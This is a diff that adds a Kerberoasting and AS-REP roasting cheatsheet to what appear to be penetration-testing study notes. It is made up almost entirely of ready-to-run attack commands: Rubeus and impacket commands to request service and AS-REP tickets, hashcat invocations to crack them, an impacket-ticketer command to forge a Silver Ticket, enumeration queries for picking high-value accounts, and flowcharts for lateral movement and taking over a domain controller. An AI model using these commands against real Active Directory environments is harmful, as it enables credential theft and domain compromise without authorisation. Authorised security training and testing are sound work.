@@ -115,7 +115,186 @@ Basic Kerberoasting Flow
 
 ---
 
+### Kerberoast Cheatsheet
+
+Windows go to imo
+```powershell
+# Enumerate only
+.\Rubeus.exe kerberoast /stats
+
+# Request all TGS tickets and output as hashcat format
+.\Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat
+```
+
+Linux go to imo
+```bash
+# Enumerate + request tickets
+impacket-GetUserSPNs domain.com/lowprivuser:Password123 \
+  -dc-ip 192.168.x.x -request -outputfile kerberoast_hashes.txt
+```
+
+e.g. 
+```
+# captured hash
+$krb5tgs$23$*svcSQL$DOMAIN.COM$domain.com/svcSQL*$a3f2...
+```
+
+| Part      | Meaning                                                |
+| --------- | ------------------------------------------------------ |
+| `krb5tgs` | Kerberos TGS ticket                                    |
+| `23`      | Encryption type — **RC4 (type 23)** = crackable fast ✅ |
+| `18`      | AES256 = much harder to crack ⚠️                       |
+| `svcSQL`  | The service account name                               |
+
+```bash
+hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
+# Add rules for better coverage:
+hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule
+# for AES
+hashcat -m 19700 hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+```bash
+Rooted Machine
+      │
+      ▼
+Enumerate SPNs (from your shell — you're domain-authenticated)
+      │
+      ▼
+Request TGS tickets (you just need any domain user credential)
+      │
+      ├─→ Crack hash → service account password
+      │         │
+      │         ▼
+      │   Does that account have local admin on Machine 2? → lateral move
+      │   Is it Domain Admin? → own the DC
+      │
+      └─→ No crack? → look at what privileges the account has anyway
+```
+
+
+hashcrack kereberoast troubleshooting
+
+| Reason                       | Signal                          | Fix                                                        |
+| ---------------------------- | ------------------------------- | ---------------------------------------------------------- |
+| AES (type 18) instead of RC4 | Hash starts with `$krb5tgs$18$` | Try anyway, but expect it to be slow — or try other paths  |
+| Strong/non-standard password | rockyou exhausted, no hit       | Try bigger wordlists, custom rules, OSCP-specific patterns |
+| Wrong hashcat mode           | Errors or 0 candidates          | Double-check `-m 13100` vs `-m 19700`                      |
+| Truncated hash               | File copy error                 | Re-request the ticket cleanly                              |
+
+no crack -> Silver Ticket
+- fake TGS that grants you access to that specific service without ever knowing the password or touching the DC
+```bash
+impacket-ticketer -nthash <service_NTLM_hash> \
+  -domain-sid <S-1-5-21-...> \
+  -domain domain.com \
+  -spn MSSQLSvc/sql01.domain.com:1433 \
+  FakeUser
+```
+
+```powershell
+# From your rooted machine
+net user svcSQL /domain
+# Look at: Group Memberships, Password Last Set, Last Logon
+```
+
+```
+Kerberoast fails
+       │
+       ├─→ AS-REP Roasting — accounts with pre-auth disabled (no password needed to request)
+       ├─→ Password spraying — you know usernames now from your SPN enumeration
+       ├─→ ACL abuse — does your current user have WriteDACL/GenericAll on anything?
+       ├─→ BloodHound — map the whole privilege graph visually
+       └─→ Local privilege paths — anything else on your rooted machine to pivot from?
+```
+
+```powershell
+# PowerView — full detail on kerberoastable accounts
+Get-DomainUser -SPN -Properties samaccountname, serviceprincipalname, memberof, passwordlastset, lastlogon, admincount | Format-List
+  
+# Native — per account deep dive
+net user svcSQL /domain
+```
+
+| Field                  | What It Tells You                                                                  |
+| ---------------------- | ---------------------------------------------------------------------------------- |
+| `PasswordLastSet`      | Old date (pre-2020) → likely weak, manually set password → **prioritize cracking** |
+| `LastLogon`            | Never or very old → account may be abandoned → often has weak password             |
+| `admincount = 1`       | Was/is in a privileged group at some point → **high value target**                 |
+| `MemberOf`             | Domain Admins? Local admin groups? → tells you what you _win_ if you crack it      |
+| `ServicePrincipalName` | `MSSQLSvc/...` → SQL service → often runs as a named user account, not SYSTEM      |
+
+```
+e.g. 
+Password set 2016 + admincount=1 + member of "DB Admins" = CRACK THIS FIRST Password set last week + no group memberships = low priority
+```
+
+#### Kerberoast vs AS-REP Roast — The Key Differences
+
+
+#### Enumeration — Finding AS-REP Roastable Accounts
+
+```powershell
+# Enumerate and request in one shot
+.\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
+
+# Target specific user
+.\Rubeus.exe asreproast /user:svcBackup /format:hashcat
+
+# Powerview
+Get-DomainUser -PreauthNotRequired -Properties samaccountname, memberof, passwordlastset
+
+# Native AD
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} ` -Properties DoesNotRequirePreAuth, MemberOf, PasswordLastSet
+```
+
+```bash
+impacket-GetNPUsers domain.com/ -usersfile usernames.txt \ -dc-ip 192.168.x.x -format hashcat -outputfile asrep_hashes.txt
+
+# If you have credentials, enumerate automatically
+impacket-GetNPUsers domain.com/lowprivuser:Password123 \
+  -dc-ip 192.168.x.x -request -format hashcat -outputfile asrep_hashes.txt
+```
+
+```
+e.g. hash output
+$krb5asrep$23$svcBackup@DOMAIN.COM:a3f2bc...
+```
+
+```bash
+hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt 
+hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule
+```
+
+
+```
+Your Rooted Machine (domain-authenticated)
+            │
+            ├──[ Kerberoast ]──────────────────────────────────────────┐
+            │   setspn -Q */*                                           │
+            │   Rubeus kerberoast / impacket-GetUserSPNs               │
+            │   → look at PasswordLastSet + admincount + groups         │
+            │                                                           │
+            ├──[ AS-REP Roast ]────────────────────────────────────────┤
+            │   Rubeus asreproast / impacket-GetNPUsers                 │
+            │   → no creds needed, DC responds directly                 │
+            │                                                           ▼
+            │                                               Cracked credentials
+            │                                                           │
+            │                                    ┌──────────────────────┤
+            │                                    ▼                      ▼
+            │                            Local admin on          Domain Admin
+            │                            Machine 2?              → own DC
+            │                            → lateral move
+            │
+            └──[ BloodHound ]── map everything, find shortest path
+```
+
+
+
+---
 ### Find Kerberoastable Users
+
 Find SPNs with native command:
 ```cmd
 :: Native command
